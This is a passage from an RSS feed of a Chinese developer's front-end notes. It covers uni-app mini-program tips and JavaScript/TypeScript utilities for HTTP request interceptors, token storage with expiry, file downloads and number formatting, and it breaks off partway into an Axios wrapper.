<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br></div></div><h2 id="_5-tips"> 5. Tips</h2>
<ul>
<li>
<p>Vue 原型中定义的属性，在 template 中不可用。</p>
</li>
<li>
<p>IOS 设备底部 margin 无效，使用 padding 解决。</p>
</li>
<li>
<p>图片预览可以保存图片，不需要配置 https 安全域名。</p>
</li>
<li>
<p>日期应用 1970/01/01 方式，不用 1970-01-01，在 IOS 中 new Date(1970-01-01) 会报错。</p>
</li>
<li>
<p>input 的 placeholder 样式更改，style 不能使用 scoped。</p>
</li>
<li>
<p>字体图标渐变样式在 IOS 可能会不显示。</p>
</li>
<li>
<p>不可巧用 JSON.stringify() 机制在传参时用 void 0（undefined）。</p>
</li>
<li>
<p>插件市场封装的绘图插件可能在 IOS 上不显示。</p>
</li>
<li>
<p>cover-image 的 padding 区域不能监听事件，采用 cover-view 包裹。</p>
</li>
<li>
<p>cover-view</p>
<blockquote>
<ul>
<li>嵌套在 map、canvas、camera 等原生控件里才可覆盖；</li>
<li>只能嵌套 cover-view 标签；</li>
<li>不能使用渐变色，盒子阴影无效；</li>
<li>flex 布局文本居中无效，可用 padding 挤挤居中；</li>
<li>边框必须四边都有，否则无效；</li>
<li>真机会有渲染慢而出现移动现象，可以采用延时显示（v-show）解决；</li>
</ul>
</blockquote>
</li>
</ul>
]]></content:encoded>
    </item>
    <item>
      <title>Uni-App</title>
      <link>https://www.matrixtheone.ga/web/note/Uni-App/</link>
      <guid>https://www.matrixtheone.ga/web/note/Uni-App/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">Uni-App</source>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<img :src="$withBase('/images/Movie/盗梦空间.webp')">
]]></content:encoded>
    </item>
    <item>
      <title>Utils</title>
      <link>https://www.matrixtheone.ga/web/note/Uni-App/Utils/</link>
      <guid>https://www.matrixtheone.ga/web/note/Uni-App/Utils/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">Utils</source>
      <category>Uni App</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<h2 id="_1-fly-请求封装"> 1. Fly 请求封装</h2>
<ul>
<li><a href="https://wendux.github.io/dist/#/doc/flyio/readme" target="_blank" rel="noopener noreferrer">DOC</a></li>
</ul>
<div><pre><code><span>import</span> storage <span>from</span> <span>'./storage'</span>
<span>import</span> qs <span>from</span> <span>'qs'</span>
<span>import</span> <span>{</span> baseUrl <span>}</span> <span>from</span> <span>'@/config'</span>
<span>import</span> <span>{</span> <span>ACCESS_TOKEN</span> <span>}</span> <span>from</span> <span>'@/store/mutation-types'</span>

<span>const</span> loginPath <span>=</span> <span>'subPages/login/index'</span>

<span>// 浏览器和React Native</span>
<span>// const Fly = require('flyio/dist/npm/fly')</span>
<span>// 微信小程序</span>
<span>const</span> Fly <span>=</span> <span>require</span><span>(</span><span>'flyio/dist/npm/wx'</span><span>)</span>
<span>const</span> fly <span>=</span> <span>new</span> <span>Fly</span><span>(</span><span>)</span>

<span>//设置超时</span>
fly<span>.</span>config<span>.</span>timeout <span>=</span> <span>30000</span>
<span>//设置请求基地址</span>
fly<span>.</span>config<span>.</span>baseURL <span>=</span> baseUrl

<span>const</span> <span>showToast</span> <span>=</span> <span>title</span> <span>=></span>
  uni<span>.</span><span>showToast</span><span>(</span><span>{</span>
    title<span>,</span>
    <span>icon</span><span>:</span> <span>'none'</span><span>,</span>
    <span>position</span><span>:</span> <span>'bottom'</span><span>,</span>
  <span>}</span><span>)</span>

<span>const</span> codeMessage <span>=</span> <span>{</span>
  <span>400</span><span>:</span> <span>'请求错误'</span><span>,</span>
  <span>401</span><span>:</span> <span>'请重新登录'</span><span>,</span>
  <span>403</span><span>:</span> <span>'拒绝访问'</span><span>,</span>
  <span>404</span><span>:</span> <span>'请求地址错误'</span><span>,</span>
  <span>500</span><span>:</span> <span>'服务器错误'</span><span>,</span>
  <span>502</span><span>:</span> <span>'网关错误'</span><span>,</span>
  <span>503</span><span>:</span> <span>'服务不可用'</span><span>,</span>
  <span>504</span><span>:</span> <span>'网关超时'</span><span>,</span>
<span>}</span>

<span>const</span> <span>layout</span> <span>=</span> <span>(</span><span>)</span> <span>=></span> <span>{</span>
  storage<span>.</span><span>remove</span><span>(</span><span>ACCESS_TOKEN</span><span>)</span>
  <span>setTimeout</span><span>(</span><span>(</span><span>)</span> <span>=></span> <span>{</span>
    <span>const</span> pathname <span>=</span> <span>getCurrentPages</span><span>(</span><span>)</span><span>.</span><span>slice</span><span>(</span><span>-</span><span>1</span><span>)</span><span>[</span><span>0</span><span>]</span><span>.</span>route
    <span>if</span> <span>(</span>pathname <span>!==</span> loginPath<span>)</span> <span>{</span>
      uni<span>.</span><span>reLaunch</span><span>(</span><span>{</span> <span>url</span><span>:</span> loginPath <span>}</span><span>)</span>
    <span>}</span>
  <span>}</span><span>,</span> <span>1500</span><span>)</span>
  uni<span>.</span><span>hideToast</span><span>(</span><span>)</span>
  <span>showToast</span><span>(</span>codeMessage<span>[</span><span>401</span><span>]</span><span>)</span>
<span>}</span>

<span>// 异常拦截器</span>
<span>const</span> <span>errorHandler</span> <span>=</span> <span>error</span> <span>=></span> <span>{</span>
  uni<span>.</span><span>hideLoading</span><span>(</span><span>)</span>
  uni<span>.</span><span>stopPullDownRefresh</span><span>(</span><span>)</span>
  <span>if</span> <span>(</span>error<span>.</span>response<span>)</span> <span>{</span>
    <span>const</span> status <span>=</span> error<span>.</span>response<span>.</span>status
    <span>if</span> <span>(</span>status <span>===</span> <span>401</span><span>)</span> <span>layout</span><span>(</span><span>)</span>
    <span>else</span> <span>{</span>
      codeMessage<span>[</span>status<span>]</span> <span>&amp;&amp;</span> <span>showToast</span><span>(</span>codeMessage<span>[</span>status<span>]</span><span>)</span>
    <span>}</span>
  <span>}</span>

  <span>return</span> Promise<span>.</span><span>reject</span><span>(</span>error<span>)</span>
<span>}</span>

<span>// 请求拦截器</span>
fly<span>.</span>interceptors<span>.</span>request<span>.</span><span>use</span><span>(</span><span>config</span> <span>=></span> <span>{</span>
  <span>const</span> token <span>=</span> storage<span>.</span><span>get</span><span>(</span><span>ACCESS_TOKEN</span><span>)</span>
  <span>if</span> <span>(</span>token<span>)</span> config<span>.</span>headers<span>[</span><span>'Authorization'</span><span>]</span> <span>=</span> token

  <span>// 处理GET请求时参数携带数组情况</span>
  <span>if</span> <span>(</span>config<span>.</span>method <span>===</span> <span>'get'</span><span>)</span> <span>{</span>
    config<span>.</span><span>paramsSerializer</span> <span>=</span> <span>params</span> <span>=></span>
      qs<span>.</span><span>stringify</span><span>(</span>params<span>,</span> <span>{</span> <span>arrayFormat</span><span>:</span> <span>'repeat'</span> <span>}</span><span>)</span>
  <span>}</span>

  <span>return</span> config
<span>}</span><span>,</span> errorHandler<span>)</span>

<span>// 响应拦截器</span>
fly<span>.</span>interceptors<span>.</span>response<span>.</span><span>use</span><span>(</span><span>(</span><span><span>{</span> data <span>}</span></span><span>)</span> <span>=></span> <span>{</span>
  uni<span>.</span><span>hideLoading</span><span>(</span><span>)</span>
  uni<span>.</span><span>stopPullDownRefresh</span><span>(</span><span>)</span>
  <span>const</span> map <span>=</span> <span>{</span>
    <span>401</span><span>:</span> <span>(</span><span>)</span> <span>=></span> <span>{</span>
      <span>layout</span><span>(</span><span>)</span>
      <span>return</span> Promise<span>.</span><span>reject</span><span>(</span>data<span>)</span>
    <span>}</span><span>,</span>
    <span>200</span><span>:</span> <span>(</span><span>)</span> <span>=></span> data<span>,</span>
    <span>default</span><span>:</span> <span>(</span><span>)</span> <span>=></span> <span>{</span>
      message<span>.</span><span>error</span><span>(</span>data<span>?.</span>errorMsg <span>||</span> <span>'请求错误'</span><span>)</span>
      <span>return</span> Promise<span>.</span><span>reject</span><span>(</span>data<span>)</span>
    <span>}</span><span>,</span>
  <span>}</span>

  <span>return</span> map<span>[</span>data<span>.</span>code<span>]</span><span>?.</span><span>(</span><span>)</span> <span>||</span> map<span>.</span><span>default</span><span>(</span><span>)</span>
<span>}</span><span>,</span> errorHandler<span>)</span>

<span>export</span> <span>default</span> fly
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br><span>63</span><br><span>64</span><br><span>65</span><br><span>66</span><br><span>67</span><br><span>68</span><br><span>69</span><br><span>70</span><br><span>71</span><br><span>72</span><br><span>73</span><br><span>74</span><br><span>75</span><br><span>76</span><br><span>77</span><br><span>78</span><br><span>79</span><br><span>80</span><br><span>81</span><br><span>82</span><br><span>83</span><br><span>84</span><br><span>85</span><br><span>86</span><br><span>87</span><br><span>88</span><br><span>89</span><br><span>90</span><br><span>91</span><br><span>92</span><br><span>93</span><br><span>94</span><br><span>95</span><br><span>96</span><br><span>97</span><br></div></div><h2 id="_2-storage-封装"> 2. storage 封装</h2>
<ul>
<li>新增有效期设置。</li>
</ul>
<div><pre><code><span>class</span> <span>Storage</span> <span>{</span>
  <span>set</span><span>(</span>key<span>,</span> val<span>,</span> exp<span>)</span> <span>{</span>
    <span>try</span> <span>{</span>
      uni<span>.</span><span>setStorageSync</span><span>(</span>key<span>,</span> <span>{</span> val<span>,</span> exp<span>,</span> <span>time</span><span>:</span> Date<span>.</span><span>now</span><span>(</span><span>)</span> <span>}</span><span>)</span>
    <span>}</span> <span>catch</span> <span>(</span>e<span>)</span> <span>{</span>
      console<span>.</span><span>log</span><span>(</span>e<span>)</span>
    <span>}</span>
  <span>}</span>
  <span>get</span><span>(</span>key<span>)</span> <span>{</span>
    <span>try</span> <span>{</span>
      <span>const</span> data <span>=</span> uni<span>.</span><span>getStorageSync</span><span>(</span>key<span>)</span>
      <span>if</span> <span>(</span><span>!</span>data<span>)</span> <span>return</span> <span>null</span>
      <span>if</span> <span>(</span>Date<span>.</span><span>now</span><span>(</span><span>)</span> <span>-</span> data<span>.</span>time <span>></span> data<span>.</span>exp<span>)</span> <span>{</span>
        <span>this</span><span>.</span><span>remove</span><span>(</span>key<span>)</span>
        <span>return</span> <span>null</span>
      <span>}</span>
      <span>return</span> data<span>.</span>val
    <span>}</span> <span>catch</span> <span>(</span>e<span>)</span> <span>{</span>
      console<span>.</span><span>log</span><span>(</span>e<span>)</span>
    <span>}</span>
  <span>}</span>
  <span>getInfo</span><span>(</span><span>)</span> <span>{</span>
    <span>try</span> <span>{</span>
      <span>return</span> uni<span>.</span><span>getStorageInfoSync</span><span>(</span><span>)</span>
    <span>}</span> <span>catch</span> <span>(</span>e<span>)</span> <span>{</span>
      console<span>.</span><span>log</span><span>(</span>e<span>)</span>
    <span>}</span>
  <span>}</span>
  <span>has</span><span>(</span><span>key</span><span>)</span> <span>{</span>
    <span>try</span> <span>{</span>
      <span>return</span> <span>!</span><span>!</span><span>this</span><span>.</span><span>get</span><span>(</span>key<span>)</span>
    <span>}</span> <span>catch</span> <span>(</span>e<span>)</span> <span>{</span>
      console<span>.</span><span>log</span><span>(</span>e<span>)</span>
    <span>}</span>
  <span>}</span>
  <span>remove</span><span>(</span><span>key</span><span>)</span> <span>{</span>
    <span>try</span> <span>{</span>
      uni<span>.</span><span>removeStorageSync</span><span>(</span>key<span>)</span>
    <span>}</span> <span>catch</span> <span>(</span>e<span>)</span> <span>{</span>
      console<span>.</span><span>log</span><span>(</span>e<span>)</span>
    <span>}</span>
  <span>}</span>
  <span>clear</span><span>(</span><span>)</span> <span>{</span>
    <span>try</span> <span>{</span>
      uni<span>.</span><span>clearStorageSync</span><span>(</span><span>)</span>
    <span>}</span> <span>catch</span> <span>(</span>e<span>)</span> <span>{</span>
      console<span>.</span><span>log</span><span>(</span>e<span>)</span>
    <span>}</span>
  <span>}</span>
<span>}</span>

<span>export</span> <span>default</span> <span>new</span> <span>Storage</span><span>(</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br></div></div><h2 id="_3-helper"> 3. helper</h2>
<ul>
<li>
<p>main.js</p>
<div><pre><code><span>import</span> helper <span>from</span> <span>'./utils/helper'</span>
Vue<span>.</span><span>use</span><span>(</span>helper<span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br></div></div></li>
<li>
<p>helper.js</p>
<div><pre><code><span>const</span> helper <span>=</span> <span>{</span>
  <span>$log</span><span>:</span> console<span>.</span>log<span>,</span>
  <span>$mainColor</span><span>:</span> <span>'#00D1FF'</span><span>,</span>
  <span>$bgColor</span><span>:</span> <span>'#121522'</span><span>,</span>
  <span>$errorColor</span><span>:</span> <span>'#E05164'</span><span>,</span>
  <span>$back</span><span>:</span> uni<span>.</span>navigateBack<span>,</span>
  <span>$toFixed</span><span>:</span> <span>(</span><span>val<span>,</span> exp</span><span>)</span> <span>=></span> <span>{</span>
    <span>return</span> <span>[</span><span>void</span> <span>0</span><span>,</span> <span>NaN</span><span>]</span><span>.</span><span>includes</span><span>(</span>val<span>)</span>
      <span>?</span> <span>(</span><span>0</span><span>)</span><span>.</span><span>toFixed</span><span>(</span>exp<span>)</span>
      <span>:</span> <span>(</span>Math<span>.</span><span>round</span><span>(</span>val <span>*</span> Math<span>.</span><span>pow</span><span>(</span><span>10</span><span>,</span> exp<span>)</span><span>)</span> <span>/</span> Math<span>.</span><span>pow</span><span>(</span><span>10</span><span>,</span> exp<span>)</span><span>)</span><span>.</span><span>toFixed</span><span>(</span>exp<span>)</span>
  <span>}</span><span>,</span>
<span>}</span>

<span>export</span> <span>default</span> <span>{</span>
  <span>install</span><span>(</span><span>Vue</span><span>)</span> <span>{</span>
    Object<span>.</span><span>entries</span><span>(</span>helper<span>)</span><span>.</span><span>forEach</span><span>(</span>
      <span>(</span><span><span>[</span>key<span>,</span> value<span>]</span></span><span>)</span> <span>=></span> <span>(</span><span>Vue</span><span>.</span>prototype<span>[</span>key<span>]</span> <span>=</span> value<span>)</span>
    <span>)</span>
  <span>}</span><span>,</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br></div></div></li>
</ul>
<div><p>注意</p>
<p>小程序 Vue 原型中定义的属性，在 template 中不可用。</p>
</div>
]]></content:encoded>
    </item>
    <item>
      <title>Common</title>
      <link>https://www.matrixtheone.ga/web/note/Utils/Common/</link>
      <guid>https://www.matrixtheone.ga/web/note/Utils/Common/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">Common</source>
      <category>Utils</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<h2 id="_1-await-错误处理"> 1. await 错误处理</h2>
<div><pre><code><span>/**
 * @param {Promise&lt;any>} promise
 * @return {Promise&lt;any[]>} [error, result]
 */</span>
<span>export</span> <span>const</span> awaitWarper <span>=</span> <span>&lt;</span><span>E</span><span>,</span> <span>V</span><span>></span><span>(</span>promise<span>:</span> <span>Promise</span><span>&lt;</span><span>V</span><span>></span><span>)</span> <span>=></span> <span>{</span>
  <span>return</span> promise
    <span>.</span><span>then</span><span>(</span><span>(</span>res<span>:</span> <span>V</span><span>)</span> <span>=></span> <span>[</span><span>null</span><span>,</span> res<span>]</span><span>)</span>
    <span>.</span><span>catch</span><span>(</span><span>(</span>err<span>:</span> <span>E</span><span>)</span> <span>=></span> <span>[</span>err<span>,</span> <span>null</span><span>]</span><span>)</span> <span>as</span> <span>Promise</span><span>&lt;</span><span>[</span><span>E</span><span>,</span> <span>V</span><span>]</span><span>></span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Document</title>
      <link>https://www.matrixtheone.ga/web/note/Utils/Document/</link>
      <guid>https://www.matrixtheone.ga/web/note/Utils/Document/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">Document</source>
      <category>Utils</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<h2 id="_1-检测内容是否溢出"> 1. 检测内容是否溢出</h2>
<div><pre><code><span>/**
 * @param {Element} element
 * @return {boolean} true | false
 */</span>
<span>export</span> <span>const</span> <span>checkOverflow</span> <span>=</span> <span>(</span>element<span>:</span> Element<span>)</span> <span>=></span> <span>{</span>
  <span>return</span> <span>(</span>
    element<span>.</span>clientWidth <span>&lt;</span> element<span>.</span>scrollWidth <span>||</span>
    element<span>.</span>clientHeight <span>&lt;</span> element<span>.</span>scrollHeight
  <span>)</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Download</title>
      <link>https://www.matrixtheone.ga/web/note/Utils/Download/</link>
      <guid>https://www.matrixtheone.ga/web/note/Utils/Download/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">Download</source>
      <category>Utils</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<h2 id="_1-下载文件"> 1. 下载文件</h2>
<div><pre><code><span>/**
 * @param {string} url 下载链接
 * @param {string} name 保存文件名称
 */</span>
<span>export</span> <span>const</span> <span>downloadFile</span> <span>=</span> <span>(</span>url<span>:</span> <span>string</span><span>,</span> name<span>:</span> <span>string</span><span>)</span> <span>=></span> <span>{</span>
  <span>const</span> a <span>=</span> document<span>.</span><span>createElement</span><span>(</span><span>'a'</span><span>)</span>
  a<span>.</span>href <span>=</span> url
  a<span>.</span>download <span>=</span> name
  document<span>.</span>body<span>.</span><span>appendChild</span><span>(</span>a<span>)</span>
  a<span>.</span><span>click</span><span>(</span><span>)</span>
  a<span>.</span><span>remove</span><span>(</span><span>)</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br></div></div><h2 id="_2-下载二进制数据"> 2. 下载二进制数据</h2>
<div><pre><code><span>/**
 * @param {Blob} blob 下载二进制对象
 * @param {string} name 保存文件名称
 */</span>
<span>export</span> <span>const</span> <span>downloadFile</span> <span>=</span> <span>(</span>blob<span>:</span> Blob<span>,</span> name<span>:</span> <span>string</span><span>)</span> <span>=></span> <span>{</span>
  <span>const</span> a <span>=</span> document<span>.</span><span>createElement</span><span>(</span><span>'a'</span><span>)</span>
  <span>const</span> url <span>=</span> window<span>.</span><span>URL</span><span>.</span><span>createObjectURL</span><span>(</span>blob<span>)</span>
  a<span>.</span>href <span>=</span> url
  a<span>.</span>download <span>=</span> name
  document<span>.</span>body<span>.</span><span>appendChild</span><span>(</span>a<span>)</span>
  a<span>.</span><span>click</span><span>(</span><span>)</span>
  a<span>.</span><span>remove</span><span>(</span><span>)</span>
  window<span>.</span><span>URL</span><span>.</span><span>revokeObjectURL</span><span>(</span>url<span>)</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br></div></div><h2 id="_3-使用-filesaver-下载"> 3. 使用 FileSaver 下载</h2>
<ul>
<li><a href="https://github.com/eligrey/FileSaver.js" target="_blank" rel="noopener noreferrer">FileSaver</a></li>
</ul>
<div><pre><code><span>import</span> <span>{</span> saveAs <span>}</span> <span>from</span> <span>'file-saver'</span>

<span>saveAs</span><span>(</span><span>'Blob/File/Url'</span><span>,</span> <span>'name'</span><span>)</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Numeral</title>
      <link>https://www.matrixtheone.ga/web/note/Utils/Numeral/</link>
      <guid>https://www.matrixtheone.ga/web/note/Utils/Numeral/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">Numeral</source>
      <category>Utils</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<h2 id="_1-四舍五入"> 1. 四舍五入</h2>
<div><pre><code><span>/**
 * @param {number | string} num 值
 * @param {number} reserved 保留位数，默认值：2
 * @return {string} string
 */</span>
<span>export</span> <span>const</span> <span>round</span> <span>=</span> <span>(</span>num<span>?</span><span>:</span> <span>number</span> <span>|</span> <span>string</span><span>,</span> reserved<span>:</span> <span>number</span> <span>=</span> <span>2</span><span>)</span> <span>=></span> <span>{</span>
  <span>const</span> pureNum <span>=</span> <span>Number</span><span>(</span>num<span>)</span>
  <span>if</span> <span>(</span><span>!</span>num <span>||</span> Number<span>.</span><span>isNaN</span><span>(</span>pureNum<span>)</span><span>)</span> <span>return</span> num<span>?.</span><span>toString</span><span>(</span><span>)</span> <span>||</span> <span>''</span>

  <span>return</span> <span>(</span>
    Math<span>.</span><span>round</span><span>(</span>pureNum <span>*</span> Math<span>.</span><span>pow</span><span>(</span><span>10</span><span>,</span> reserved<span>)</span><span>)</span> <span>/</span> Math<span>.</span><span>pow</span><span>(</span><span>10</span><span>,</span> reserved<span>)</span>
  <span>)</span><span>.</span><span>toFixed</span><span>(</span>reserved<span>)</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br></div></div><h2 id="_2-单位格式化"> 2. 单位格式化</h2>
<div><pre><code><span>import</span> <span>{</span> round <span>}</span> <span>from</span> <span>'lodash'</span>

<span>/**
 * @param {number | string} num 值
 * @param {number} reserved 保留位数，默认值：2
 * @return {string} string
 */</span>
<span>export</span> <span>const</span> <span>monetization</span> <span>=</span> <span>(</span>num<span>?</span><span>:</span> <span>number</span> <span>|</span> <span>string</span><span>,</span> reserved<span>:</span> <span>number</span> <span>=</span> <span>2</span><span>)</span> <span>=></span> <span>{</span>
  <span>const</span> pureNum <span>=</span> <span>Number</span><span>(</span>num<span>)</span>
  <span>if</span> <span>(</span><span>!</span>num <span>||</span> Number<span>.</span><span>isNaN</span><span>(</span>pureNum<span>)</span><span>)</span> <span>return</span> num<span>?.</span><span>toString</span><span>(</span><span>)</span> <span>||</span> <span>''</span>

  <span>const</span> <span>{</span> length <span>}</span> <span>=</span> Number<span>.</span><span>parseInt</span><span>(</span>pureNum<span>.</span><span>toString</span><span>(</span><span>)</span><span>)</span><span>.</span><span>toString</span><span>(</span><span>)</span>
  <span>switch</span> <span>(</span><span>true</span><span>)</span> <span>{</span>
    <span>case</span> length <span>></span> <span>12</span><span>:</span>
      <span>return</span> <span>convertUnit</span><span>(</span><span>12</span><span>,</span> <span>'万亿'</span><span>)</span>
    <span>case</span> length <span>></span> <span>8</span><span>:</span>
      <span>return</span> <span>convertUnit</span><span>(</span><span>8</span><span>,</span> <span>'亿'</span><span>)</span>
    <span>case</span> length <span>></span> <span>4</span><span>:</span>
      <span>return</span> <span>convertUnit</span><span>(</span><span>4</span><span>,</span> <span>'万'</span><span>)</span>
    <span>default</span><span>:</span>
      <span>return</span> <span>round</span><span>(</span>pureNum<span>,</span> reserved<span>)</span><span>.</span><span>toString</span><span>(</span><span>)</span>
  <span>}</span>

  <span>function</span> <span>convertUnit</span><span>(</span>digit<span>:</span> <span>number</span><span>,</span> unit<span>:</span> <span>string</span> <span>=</span> <span>''</span><span>)</span> <span>{</span>
    <span>const</span> divisor <span>=</span> pureNum <span>/</span> Math<span>.</span><span>pow</span><span>(</span><span>10</span><span>,</span> digit<span>)</span>
    <span>return</span> <span><span>`</span><span><span>${</span><span>round</span><span>(</span>divisor<span>,</span> reserved<span>)</span><span>}</span></span><span><span>${</span>unit<span>}</span></span><span>`</span></span>
  <span>}</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br></div></div><h2 id="_3-numeraljs"> 3. <a href="http://numeraljs.com/" target="_blank" rel="noopener noreferrer">numeraljs</a></h2>
]]></content:encoded>
    </item>
    <item>
      <title>Request</title>
      <link>https://www.matrixtheone.ga/web/note/Utils/Request/</link>
      <guid>https://www.matrixtheone.ga/web/note/Utils/Request/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">Request</source>
      <category>Utils</category>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<h2 id="_1-request"> 1. Request</h2>
<ul>
<li><a href="https://axios-http.com/zh/docs/intro" target="_blank" rel="noopener noreferrer">Axios</a></li>
</ul>
<div><pre><code><span>import</span> <span>{</span> message<span>,</span> notification <span>}</span> <span>from</span> <span>'antd'</span>
<span>import</span> axios <span>from</span> <span>'axios'</span>
<span>import</span> <span>type</span> <span>{</span> Axios<span>,</span> AxiosPromise<span>,</span> AxiosRequestConfig <span>}</span> <span>from</span> <span>'axios'</span>
<span>import</span> history <span>from</span> <span>'history/browser'</span>
<span>import</span> qs <span>from</span> <span>'qs'</span>
<span>import</span> <span>{</span> stringify <span>}</span> <span>from</span> <span>'querystring'</span>
<span>import</span> <span>{</span> UserStoreEnum <span>}</span> <span>from</span> <span>'@/constant/store'</span>
<span>import</span> store <span>from</span> <span>'@/utils/store'</span>

<span>enum</span> CodeTypeEnum <span>{</span>
  <span>SUCCESS</span> <span>=</span> <span>'SUCCESS'</span><span>,</span>
  <span>REDIRECT</span> <span>=</span> <span>'REDIRECT'</span><span>,</span>
  <span>BACK_PREVIOUS</span> <span>=</span> <span>'BACK_PREVIOUS'</span><span>,</span>
  <span>ERROR_MESSAGE</span> <span>=</span> <span>'ERROR_MESSAGE'</span><span>,</span>
  <span>ERROR_NOTIFICATION</span> <span>=</span> <span>'ERROR_NOTIFICATION'</span><span>,</span>
<span>}</span>

<span>const</span> CodeType <span>=</span> <span>{</span>
  <span>1</span><span>:</span> CodeTypeEnum<span>.</span><span>SUCCESS</span><span>,</span>
  <span>2</span><span>:</span> CodeTypeEnum<span>.</span><span>REDIRECT</span><span>,</span>
  <span>3</span><span>:</span> CodeTypeEnum<span>.</span><span>REDIRECT</span><span>,</span>
  <span>7</span><span>:</span> CodeTypeEnum<span>.</span><span>REDIRECT</span><span>,</span>
  <span>8</span><span>:</span> CodeTypeEnum<span>.</span><span>REDIRECT</span><span>,</span>
  <span>101</span><span>:</span> CodeTypeEnum<span>.</span><span>ERROR_MESSAGE</span><span>,</span>
  <span>403</span><span>:</span> CodeTypeEnum<span>.</span><span>ERROR_MESSAGE</span><span>,</span>
<span>}</span>

<span>const</span> codeMessage <span>=</span> <span>{</span>
